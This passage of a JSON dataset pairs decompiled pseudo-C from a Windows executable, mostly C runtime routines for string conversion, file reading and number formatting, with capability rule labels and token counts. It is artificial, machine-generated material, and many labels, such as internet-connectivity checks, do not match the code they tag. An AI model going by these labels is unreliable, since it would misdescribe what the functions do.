        iVar3 = fcn.004136f2(1, arg_ch_00);\n                *(unaff_EBP + -0x34) = iVar3;\n                if (iVar3 != 0) {\n                    var_18h = NULL;\n                    var_1ch = 0;\n                    iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                      (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, iVar3, arg_ch_00);\n                    if (iVar3 == 0) {\n                        var_18h = *(unaff_EBP + -0x34);\n                        var_1ch = 0x41ec5f;\n                        fcn.00411031(var_18h);\n                        *(unaff_EBP + -0x34) = 0;\n                    }\n                    else if (*(unaff_EBP + -0x40) != -1) {\n                        **(unaff_EBP + 0x14) = iVar3;\n                    }\n                }\n            }\n            else {\n                var_18h = NULL;\n                var_1ch = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c)\n                                  );\n                if (iVar3 != 0) {\n                    *(unaff_EBP + -0x34) = *(unaff_EBP + 0x18);\n                }\n            }\n        }\n    }\ncode_r0x0041ec75:\n    if (*(unaff_EBP + -0x44) != 0) {\n        var_1ch = 0x41ec80;\n        var_18h = arg_8h_00;\n        fcn.00411031(arg_8h_00);\n    }\ncode_r0x0041ec84:\n    *(unaff_EBP + -0x58) = 0x41ec8f;\n    fcn.0041176c();\n    *(unaff_EBP + -0x58) = 0x41ec94;\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 1847
    },
    "0041efc5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041efc5(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *extraout_ECX;\n    code *arg_8h_00;\n    int32_t unaff_EBP;\n    code **ppcVar4;\n    code *pcVar5;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00412580(0x457e18, 0x20);\n    *(unaff_EBP + -0x1c) = 0;\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 == 2) {\n        ppcVar4 = 0x467520;\n        pcVar5 = *0x467520;\ncode_r0x0041f052:\n        *(unaff_EBP + -0x1c) = 1;\n        iVar1 = *(unaff_EBP + -0x24);\n    }\n    else {\n        if (((iVar1 != 4) && (iVar1 != 8)) && (iVar1 != 0xb)) {\n            if (iVar1 == 0xf) {\n                ppcVar4 = 0x46752c;\n                pcVar5 = *0x46752c;\n            }\n            else if (iVar1 == 0x15) {\n                ppcVar4 = 0x467524;\n                pcVar5 = *0x467524;\n            }\n            else {\n                if (iVar1 != 0x16) goto code_r0x0041f138;\n                ppcVar4 = 0x467528;\n                pcVar5 = *0x467528;\n            }\n            goto code_r0x0041f052;\n        }\n        iVar1 = fcn.00414501();\n        *(unaff_EBP + -0x24) = iVar1;\n        iVar2 = fcn.0041ede4();\n        ppcVar4 = iVar2 + 8;\n        pcVar5 = *ppcVar4;\n    }\n    arg_8h_00 = NULL;\n    *(unaff_EBP + -0x20) = pcVar5;\n    if (pcVar5 == 0x1) goto code_r0x0041f138;\n    if (pcVar5 == NULL) {\n        fcn.004123d5(3);\n        arg_8h_00 = extraout_ECX;\n    }\n    if (*(unaff_EBP + -0x1c) != arg_8h_00) {\n        fcn.00416625(arg_8h_00);\n        arg_8h_00 = NULL;\n    }\n    *(unaff_EBP + -4) = arg_8h_00;\n    iVar2 = *(unaff_EBP + 8);\n    if (((iVar2 == 8) || (iVar2 == 0xb)) || (iVar2 == 4)) {\n        *(unaff_EBP + -0x2c) = *(iVar1 + 0x58);\n        *(iVar1 + 0x58) = arg_8h_00;\n        if (iVar2 == 8) {\n            *(unaff_EBP + -0x30) = *(iVar1 + 0x5c);\n            *(iVar1 + 0x5c) = 0x8c;\n            goto code_r0x0041f0b1;\n        }\ncode_r0x0041f0dd:\n        *ppcVar4 = arg_8h_00;\n    }\n    else {\ncode_r0x0041f0b1:\n        iVar3 = *0x4645d0;\n        if (iVar2 != 8) goto code_r0x0041f0dd;\n        for (; *(unaff_EBP + -0x28) = iVar3,  iVar3 < *0x4645d4 + *0x4645d0; iVar3 = iVar3 + 1) {\n            *(*(iVar1 + 0x54) + 8 + iVar3 * 0xc) = arg_8h_00;\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041f100();\n    if (*(unaff_EBP + 8) == 8) {\n        (*pcVar5)(8, *(iVar1 + 0x5c));\n    }\n    else {\n        (*pcVar5)(*(unaff_EBP + 8));\n    }\n    iVar2 = *(unaff_EBP + 8);\n    if ((((iVar2 == 8) || (iVar2 == 0xb)) || (iVar2 == 4)) && (*(iVar1 + 0x58) = *(unaff_EBP + -0x2c),  iVar2 == 8)) {\n        *(iVar1 + 0x5c) = *(unaff_EBP + -0x30);\n    }\ncode_r0x0041f138:\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 1154
    },
    "0041f2f6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041f5cc)\n// WARNING: Removing unreachable block (ram,0x0041f546)\n// WARNING: Removing unreachable block (ram,0x0041f6a8)\n// WARNING: Removing unreachable block (ram,0x0041f558)\n// WARNING: Removing unreachable block (ram,0x0041f560)\n// WARNING: Removing unreachable block (ram,0x0041f566)\n// WARNING: Removing unreachable block (ram,0x0041f569)\n// WARNING: Removing unreachable block (ram,0x0041f570)\n// WARNING: Removing unreachable block (ram,0x0041f57a)\n// WARNING: Removing unreachable block (ram,0x0041f644)\n// WARNING: Removing unreachable block (ram,0x0041f63e)\n// WARNING: Removing unreachable block (ram,0x0041f64a)\n// WARNING: Removing unreachable block (ram,0x0041f667)\n// WARNING: Removing unreachable block (ram,0x0041f669)\n// WARNING: Removing unreachable block (ram,0x0041f671)\n// WARNING: Removing unreachable block (ram,0x0041f674)\n// WARNING: Removing unreachable block (ram,0x0041f679)\n// WARNING: Removing unreachable block (ram,0x0041f67c)\n// WARNING: Removing unreachable block (ram,0x0041f6b1)\n// WARNING: Removing unreachable block (ram,0x0041f683)\n// WARNING: Removing unreachable block (ram,0x0041f68a)\n// WARNING: Removing unreachable block (ram,0x0041f6c8)\n// WARNING: Removing unreachable block (ram,0x0041f6cf)\n// WARNING: Removing unreachable block (ram,0x0041f6d7)\n\nvoid __cdecl\nfcn.0041f2f6(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_19h;\n    uint var_14h;\n    uint var_eh;\n    uint var_ah;\n    uint var_4h;\n    \n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x0041f359. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x41f6fa\n    (**0x41f6fa)();\n    return;\n}\n",
        "token_count": 707
    },
    "0041f72a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f72a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    fcn.0041f2f6(&var_10h, arg_ch, arg_10h, arg_14h, 0, 0, 0);\n    fcn.0041b52a(&var_10h, arg_8h);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 135
    },
    "0041f776": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0041f776(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t arg_18h, int16_t *arg_1ch)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int16_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int16_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint uStack40;\n    uint uStack36;\n    uint var_1ch;\n    uchar var_18h;\n    uchar var_17h;\n    uchar var_16h;\n    uchar var_15h;\n    uchar var_14h;\n    uchar var_13h;\n    uchar var_12h;\n    uchar var_11h;\n    ushort var_10h;\n    uint var_eh;\n    uint32_t var_ah;\n    uchar var_6h;\n    char var_5h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    uVar3 = arg_10h & 0x7fff;\n    var_1ch._0_1_ = 0xcc;\n    var_1ch._1_1_ = 0xcc;\n    var_1ch._2_1_ = 0xcc;\n    var_1ch._3_1_ = 0xcc;\n    var_18h = 0xcc;\n    var_17h = 0xcc;\n    var_16h = 0xcc;\n    var_15h = 0xcc;\n    var_14h = 0xcc;\n    var_13h = 0xcc;\n    var_12h = 0xfb;\n    var_11h = 0x3f;\n    if ((arg_10h & 0x8000) == 0) {\n        *(arg_1ch + 1) = 0x20;\n    }\n    else {\n        *(arg_1ch + 1) = 0x2d;\n    }\n    if (((uVar3 == 0) && (arg_ch == 0)) && (arg_8h == 0)) {\ncode_r0x0041f8ec:\n        *(arg_1ch + 2) = 0x30;\ncode_r0x0041f9ef:\n        *arg_1ch = 0;\n        *(arg_1ch + 1) = 0x20;\n        *(arg_1ch + 3) = 1;\n        *(arg_1ch + 5) = 0;\n    }\n    else {\n        if (uVar3 == 0x7fff) {\n            *arg_1ch = 1;\n            if (((arg_ch == 0x80000000) && (arg_8h == 0)) || ((arg_ch & 0x40000000) != 0)) {\n                if (((arg_10h & 0x8000) == 0) || (arg_ch != 0xc0000000)) {\n                    if ((arg_ch != 0x80000000) || (arg_8h != 0)) goto code_r0x0041f862;\n                    pcVar8 = \"1#INF\";\n                }\n                else {\n                    if (arg_8h != 0) {\ncode_r0x0041f862:\n                        pcVar8 = \"1#QNAN\";\n                        goto code_r0x0041f867;\n                    }\n                    pcVar8 = \"1#IND\";\n                }\n                fcn.004190f0(arg_1ch + 2, pcVar8);\n                *(arg_1ch + 3) = 5;\n            }\n            else {\n                pcVar8 = \"1#SNAN\";\ncode_r0x0041f867:\n                fcn.004190f0(arg_1ch + 2, pcVar8);\n                *(arg_1ch + 3) = 6;\n            }\n            goto code_r0x0041f9d1;\n        }\n        var_10h = 0;\n        iVar6 = ((uVar3 >> 8) + (arg_ch >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar3 * 0x4d10 >> 0x10;\n        var_6h = uVar3;\n        var_5h = uVar3 >> 8;\n        var_eh = arg_8h;\n        var_ah = arg_ch;\n        fcn.00420c5f(&var_10h, -iVar6, 1);\n        if (0x3ffe < CONCAT11(var_5h, var_6h)) {\n            iVar6 = iVar6 + 1;\n            fcn.00420a2d(&var_10h, &var_1ch);\n        }\n        *arg_1ch = iVar6;\n        if (((arg_18h & 1) != 0) && (arg_14h = arg_14h + iVar6,  arg_14h < 1)) goto code_r0x0041f8ec;\n        if (0x15 < arg_14h) {\n            arg_14h = 0x15;\n        }\n        iVar7 = CONCAT11(var_5h, var_6h) - 0x3ffe;\n        var_6h = 0;\n        var_5h = '\\0';\n        arg_10h = 8;\n        do {\n            fcn.0041f1bd(&var_10h);\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        if (iVar7 < 0) {\n            for (uVar3 = -iVar7 & 0xff; uVar3 != 0; uVar3 = uVar3 - 1) {\n                fcn.0041f1eb(&var_10h);\n            }\n        }\n        arg_10h = arg_14h + 1;\n        piVar4 = arg_1ch + 2;\n        var_30h = piVar4;\n        if (0 < arg_10h) {\n            do {\n                var_ah._2_2_ = var_ah >> 0x10;\n                var_eh._2_2_ = var_eh >> 0x10;\n                var_28h = CONCAT22(var_eh, var_10h);\n                uStack40 = CONCAT22(var_ah, var_eh._2_2_);\n                uStack36 = CONCAT13(var_5h, CONCAT12(var_6h, var_ah._2_2_));\n                fcn.0041f1bd(&var_10h);\n                fcn.0041f1bd(&var_10h);\n                fcn.0041f15f(&var_10h, &var_28h);\n                fcn.0041f1bd(&var_10h);\n                piVar4 = var_30h + 1;\n                arg_10h = arg_10h + -1;\n                *var_30h = var_5h + '0';\n                var_5h = '\\0';\n                var_30h = piVar4;\n            } while (arg_10h != 0);\n        }\n        piVar5 = piVar4 + -1;\n        piVar1 = arg_1ch + 2;\n        if (*(piVar4 + -1) < '5') {\n            for (; (piVar1 <= piVar5 && (*piVar5 == '0')); piVar5 = piVar5 + -1) {\n            }\n            if (piVar5 < piVar1) {\n                *piVar1 = 0x30;\n                goto code_r0x0041f9ef;\n            }\n        }\n        else {\n            for (; (piVar1 <= piVar5 && (*piVar5 == '9')); piVar5 = piVar5 + -1) {\n                *piVar5 = 0x30;\n            }\n            if (piVar5 < piVar1) {\n                piVar5 = piVar5 + 1;\n                *arg_1ch = *arg_1ch + 1;\n            }\n            *piVar5 = *piVar5 + '\\x01';\n        }\n        cVar2 = (piVar5 - arg_1ch) + -3;\n        *(arg_1ch + 3) = cVar2;\n        *(cVar2 + 4 + arg_1ch) = 0;\n    }\ncode_r0x0041f9d1:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 1955
    },
    "0041fa04": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpBuffer\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0041fa04(uint32_t arg_8h, char *arg_ch, char *nNumberOfBytesToRead)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    int32_t lpNumberOfBytesRead;\n    char *var_8h;\n    uint lpBuffer;\n    \n    var_8h = NULL;\n    if (nNumberOfBytesToRead != NULL) {\n        piVar1 = (arg_8h >> 5) * 4 + 0x4685e0;\n        iVar9 = (arg_8h & 0x1f) * 0x24;\n        uVar3 = *(*piVar1 + iVar9 + 4);\n        if ((uVar3 & 2) == 0) {\n            pcVar8 = arg_ch;\n            if (((uVar3 & 0x48) != 0) && (*(*piVar1 + iVar9 + 5) != '\\n')) {\n                nNumberOfBytesToRead = nNumberOfBytesToRead + -1;\n                *arg_ch = *(*piVar1 + 5 + iVar9);\n                pcVar8 = arg_ch + 1;\n                var_8h = 0x1;\n                *(*piVar1 + 5 + iVar9) = 10;\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                              (*(*piVar1 + iVar9), pcVar8, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0);\n            if (iVar6 == 0) {\n                iVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                if (iVar9 == 5) {\n                    puVar7 = fcn.004131f5();\n                    *puVar7 = 9;\n                    puVar7 = fcn.004131fe();\n                    *puVar7 = 5;\n                }\n                else {\n                    if (iVar9 == 0x6d) {\n                        return 0;\n                    }\n                    fcn.00413207(iVar9);\n                }\n                return -1;\n            }\n            if ((*(*piVar1 + 4 + iVar9) & 0x80) == 0) {\n                return var_8h + lpNumberOfBytesRead;\n            }\n            if ((lpNumberOfBytesRead == 0) || (*arg_ch != '\\n')) {\n                puVar2 = *piVar1 + 4 + iVar9;\n                *puVar2 = *puVar2 & 0xfb;\n            }\n            else {\n                puVar2 = *piVar1 + 4 + iVar9;\n                *puVar2 = *puVar2 | 4;\n            }\n            var_8h = arg_ch + var_8h + lpNumberOfBytesRead;\n            nNumberOfBytesToRead = arg_ch;\n            pcVar8 = arg_ch;\n            if (arg_ch < var_8h) {\n                do {\n                    cVar4 = *nNumberOfBytesToRead;\n                    if (cVar4 == '\\x1a') {\n                        if ((*(*piVar1 + 4 + iVar9) & 0x40) == 0) {\n                            puVar2 = *piVar1 + 4 + iVar9;\n                            *puVar2 = *puVar2 | 2;\n                        }\n                        break;\n                    }\n                    if (cVar4 == '\\r') {\n                        if (nNumberOfBytesToRead < var_8h + -1) {\n                            if (nNumberOfBytesToRead[1] == '\\n') {\n                                pcVar5 = nNumberOfBytesToRead + 2;\n                                goto code_r0x0041fb91;\n                            }\ncode_r0x0041fbab:\n                            nNumberOfBytesToRead = nNumberOfBytesToRead + 1;\n                            *pcVar8 = '\\r';\n                        }\n                        else {\n                            pcVar5 = nNumberOfBytesToRead + 1;\n                            iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                                              (*(*piVar1 + iVar9), &lpBuffer, 1, &lpNumberOfBytesRead, 0);\n                            if (((iVar6 == 0) && (iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar6 != 0)) ||\n                               (lpNumberOfBytesRead == 0)) goto code_r0x0041fbab;\n                            if ((*(*piVar1 + 4 + iVar9) & 0x48) == 0) {\n                                if ((pcVar8 == arg_ch) && (lpBuffer == '\\n')) goto code_r0x0041fb91;\n                                fcn.0041bc7a(arg_8h, 0xffffffff, 1);\n                                if (lpBuffer == '\\n') goto code_r0x0041fbaf;\n                                goto code_r0x0041fbab;\n                            }\n                            if (lpBuffer == '\\n') {\ncode_r0x0041fb91:\n                                nNumberOfBytesToRead = pcVar5;\n                                *pcVar8 = '\\n';\n                            }\n                            else {\n                                *pcVar8 = '\\r';\n                                *(*piVar1 + 5 + iVar9) = lpBuffer;\n                                nNumberOfBytesToRead = pcVar5;\n                            }\n                        }\n                        pcVar8 = pcVar8 + 1;\n                        pcVar5 = nNumberOfBytesToRead;\n                    }\n                    else {\n                        *pcVar8 = cVar4;\n                        pcVar8 = pcVar8 + 1;\n                        pcVar5 = nNumberOfBytesToRead + 1;\n                    }\ncode_r0x0041fbaf:\n                    nNumberOfBytesToRead = pcVar5;\n                } while (nNumberOfBytesToRead < var_8h);\n            }\n            return pcVar8 - arg_ch;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1327
    },
    "0041fc8a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041fc8a(uint32_t param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    if (param_1 < *0x4685cc) {\n        piVar1 = (param_1 >> 5) * 4 + 0x4685e0;\n        iVar3 = (param_1 & 0x1f) * 0x24;\n        if (*(iVar3 + *piVar1) == -1) {\n            if (*0x4640c4 == 1) {\n                if (param_1 == 0) {\n                    uVar4 = 0xfffffff6;\n                }\n                else if (param_1 == 1) {\n                    uVar4 = 0xfffffff5;\n                }\n                else {\n                    if (param_1 != 2) goto code_r0x0041fce3;\n                    uVar4 = 0xfffffff4;\n                }\n                (*_sym.imp.KERNEL32.dll_SetStdHandle)(uVar4, param_2);\n            }\ncode_r0x0041fce3:\n            *(iVar3 + *piVar1) = param_2;\n            return 0;\n        }\n    }\n    puVar2 = fcn.004131f5();\n    *puVar2 = 9;\n    puVar2 = fcn.004131fe();\n    *puVar2 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 335
    },
    "0041fd06": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041fd06(uint32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    if (param_1 < *0x4685cc) {\n        piVar1 = (param_1 >> 5) * 4 + 0x4685e0;\n        iVar4 = (param_1 & 0x1f) * 0x24;\n        piVar2 = *piVar1 + iVar4;\n        if (((*(piVar2 + 1) & 1) != 0) && (*piVar2 != -1)) {\n            if (*0x4640c4 == 1) {\n                if (param_1 == 0) {\n                    uVar5 = 0xfffffff6;\n                }\n                else if (param_1 == 1) {\n                    uVar5 = 0xfffffff5;\n                }\n                else {\n                    if (param_1 != 2) goto code_r0x0041fd62;\n                    uVar5 = 0xfffffff4;\n                }\n                (*_sym.imp.KERNEL32.dll_SetStdHandle)(uVar5, 0);\n            }\ncode_r0x0041fd62:\n            *(iVar4 + *piVar1) = 0xffffffff;\n            return 0;\n        }\n    }\n    puVar3 = fcn.004131f5();\n    *puVar3 = 9;\n    puVar3 = fcn.004131fe();\n    *puVar3 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 363
    },
    "004202a7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.004202a7(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_10h;\n    \n    uVar2 = 0;\n    if (((param_1[3] & 3) == 2) && ((param_1[3] & 0x108U) != 0)) {\n        arg_10h = *param_1 - param_1[2];\n        if (0 < arg_10h) {\n            iVar1 = fcn.0041bf67(param_1[4], param_1[2], arg_10h);\n            if (iVar1 == arg_10h) {\n                if (param_1[3] < '\\0') {\n                    param_1[3] = param_1[3] & 0xfffffffd;\n                }\n            }\n            else {\n                param_1[3] = param_1[3] | 0x20;\n                uVar2 = 0xffffffff;\n            }\n        }\n    }\n    param_1[1] = 0;\n    *param_1 = param_1[2];\n    return uVar2;\n}\n",
        "token_count": 260
    },
    "004205de": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_84h\n\nvoid __cdecl fcn.004205de(int32_t arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint *noname_2;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    char *pcVar5;\n    uint var_84h;\n    uint in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint var_4h;\n    \n    if (arg_8h != 1) {\n        if (arg_8h == 0) {\n            pcVar5 = 0x467534;\n            iVar3 = fcn.00420e3e(arg_ch, arg_10h, 0x467534, 4, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, \n                                 in_stack_ffffff7c, in_stack_ffffff80);\n            if (iVar3 != 0) {\n                *arg_14h = '\\0';\n                do {\n                    cVar1 = *pcVar5;\n                    iVar3 = fcn.0041ae25(cVar1);\n                    if (iVar3 == 0) break;\n                    pcVar5 = pcVar5 + 2;\n                    *arg_14h = *arg_14h * '\\n' + cVar1 + -0x30;\n                } while (pcVar5 < 0x46753c);\n            }\n        }\n        goto code_r0x00420690;\n    }\n    noname_2 = &var_84h;\n    bVar2 = false;\n    iVar3 = fcn.00420f6e(arg_ch, arg_10h, noname_2, 0x80, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, in_stack_ffffff7c\n                         , in_stack_ffffff80);\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (((iVar3 != 0x7a) ||\n            (iVar3 = fcn.00420f6e(arg_ch, arg_10h, 0, 0, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, in_stack_ffffff7c\n                                  , in_stack_ffffff80),  iVar3 == 0)) ||\n           (noname_2 = fcn.0041101f(iVar3),  noname_2 == NULL)) goto code_r0x00420690;\n        bVar2 = true;\n        iVar3 = fcn.00420f6e(arg_ch, arg_10h, noname_2, iVar3, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, \n                             in_stack_ffffff7c, in_stack_ffffff80);\n        if (iVar3 != 0) goto code_r0x00420671;\n    }\n    else {\ncode_r0x00420671:\n        iVar4 = fcn.0041101f(iVar3);\n        *arg_14h = iVar4;\n        if (iVar4 != 0) {\n            fcn.0041c4a0(iVar4, noname_2, iVar3);\n            if (bVar2) {\n                fcn.00411031(noname_2);\n            }\n            goto code_r0x00420690;\n        }\n        if (!bVar2) goto code_r0x00420690;\n    }\n    fcn.00411031(noname_2);\ncode_r0x00420690:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 857
    },
    "00420705": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00420705(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.00414501();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x46466c) {\n        iVar1 = fcn.00419574();\n    }\n    if (*(iVar1 + 0x14) == 0) {\n        iVar2 = fcn.00420590(arg_8h, arg_ch);\n    }\n    else {\n        do {\n            iVar2 = fcn.0041b110(iVar1, *arg_8h);\n            arg_8h = arg_8h + 1;\n            iVar3 = fcn.0041b110(iVar1, *arg_ch);\n            arg_ch = arg_ch + 1;\n            if (iVar2 == 0) break;\n        } while (iVar2 == iVar3);\n        iVar2 = iVar2 - iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 252
    },
    "0042076e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042076e(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.00414501();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x46466c) {\n        iVar1 = fcn.00419574();\n    }\n    if (arg_10h == 0) {\n        iVar2 = 0;\n    }\n    else if (*(iVar1 + 0x14) == 0) {\n        iVar2 = fcn.004210b0(arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        do {\n            iVar2 = fcn.0041b110(iVar1, *arg_8h);\n            arg_8h = arg_8h + 1;\n            iVar3 = fcn.0041b110(iVar1, *arg_ch);\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n            if ((arg_10h == 0) || (iVar2 == 0)) break;\n        } while (iVar2 == iVar3);\n        iVar2 = iVar2 - iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 313
    },
    "004207ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004207ed(char *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint64_t uVar1;\n    char *pcVar2;\n    uint32_t in_EAX;\n    char *pcVar3;\n    char cVar4;\n    \n    pcVar2 = param_1;\n    if (param_3 != 0) {\n        *param_1 = '-';\n        param_1 = param_1 + 1;\n        in_EAX = -in_EAX;\n        pcVar2 = param_1;\n    }\n    do {\n        pcVar3 = pcVar2;\n        uVar1 = in_EAX;\n        in_EAX = in_EAX / param_2;\n        cVar4 = uVar1 % param_2;\n        if (uVar1 % param_2 < 10) {\n            cVar4 = cVar4 + '0';\n        }\n        else {\n            cVar4 = cVar4 + 'W';\n        }\n        *pcVar3 = cVar4;\n        pcVar2 = pcVar3 + 1;\n    } while (in_EAX != 0);\n    pcVar3[1] = '\\0';\n    do {\n        cVar4 = *pcVar3;\n        *pcVar3 = *param_1;\n        pcVar3 = pcVar3 + -1;\n        *param_1 = cVar4;\n        param_1 = param_1 + 1;\n    } while (param_1 < pcVar3);\n    return;\n}\n",
        "token_count": 340
    },
    "0042094f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
